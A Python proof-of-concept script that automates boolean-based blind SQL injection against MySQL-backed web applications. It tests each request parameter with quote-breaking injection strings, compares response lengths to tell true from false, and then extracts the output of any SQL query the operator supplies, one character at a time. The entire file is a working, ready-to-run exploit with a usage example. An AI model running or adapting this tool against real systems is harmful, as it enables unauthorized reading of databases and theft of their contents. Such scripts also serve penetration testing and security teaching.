import sys
import requests
import argparse
from urllib.parse import parse_qsl, urlencode

def response_length(data, param, payload):
    inj_dict = data.copy()
    inj_dict[param]=payload
    #prevent url encoding the payload
    inj_str= urlencode(inj_dict, safe="'/*%()=&")

    if args['method'] == 'GET':
        result = requests.get(args['url'], params=inj_str)
    elif args['method'] == 'POST':
        result = requests.post(args['url'], data=inj_str, headers={'Content-Type': 'application/x-www-form-urlencoded'}, proxies={"http":"http://127.0.0.1:8080"})
    return int(result.headers['Content-Length'])


def sqli(data, vulnerable_param, inj_str, true_len):
    # search for characters in printable ASCII range
    for j in range(32, 126): 
        payload = inj_str.replace("[CHAR]", str(j))
        # Checking response for boolean answer
        # In case query text will be inserted into response, result might be greater than True measured length
        if response_length(data, vulnerable_param, payload) >= true_len :
            return j 
    return None

def main():
    usage_example='''Usage example:

    python3 mysql_bb_poc.py --url 'http://localhost/user' --method 'GET' --param='username' --sql="select version()"'''
    parser = argparse.ArgumentParser(description='Exploit boolean based blind SQL injection in MySQL', epilog=usage_example, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('--url', help="Attacking URL", required=True)
    parser.add_argument('--sql', help='SQL query to execute', required=True)
    parser.add_argument('--data', help='Request parametrs in form of query string', required=True)
    parser.add_argument('--method', help='HTTP method. GET and POST are supported.', required=True)

    global args
    args = vars(parser.parse_args())
    query = args['sql'].replace(' ', '/**/')
    data=dict(parse_qsl(args['data']))

    injection_points=["test'/**/or/**/", "test')/**/or/**/"]
    # checking all params from data
    for param in data:
        for point in injection_points:
            print('Checking parametr {} with injection {}'.format(param, point))
            # making assumption that True and False answers has different Content-Length header and True>False
            true_len=response_length(data, param, "{}(select/**/1)=1%23".format(point))
            false_len=response_length(data, param, "{}(select/**/0)=1%23".format(point))
            if true_len>false_len:
                print('(+) Parametrs {} is vulnerable to injection {}. Starting the exploit'.format(param, point))
                vulnerable_param = param
                vulnerable_point = point
                break
        else:
            continue
        break
    if (true_len==false_len):
        print('(-) Entry point is not vulnerable to injection')
        sys.exit()
    #guessing each character from SQL query result
    i = 1
    while True:
        injection_string = "{}(ascii(substring(({}),{},1)))=[CHAR]%23".format(vulnerable_point, query, i )
        try:
            extracted_char = chr(sqli(data, vulnerable_param, injection_string, true_len)) 
            print(extracted_char, end='', flush=True)
            i+=1
        except TypeError:
            #end of result string
            break
    print("\n(+) done!")

if __name__ == "__main__":
    main()
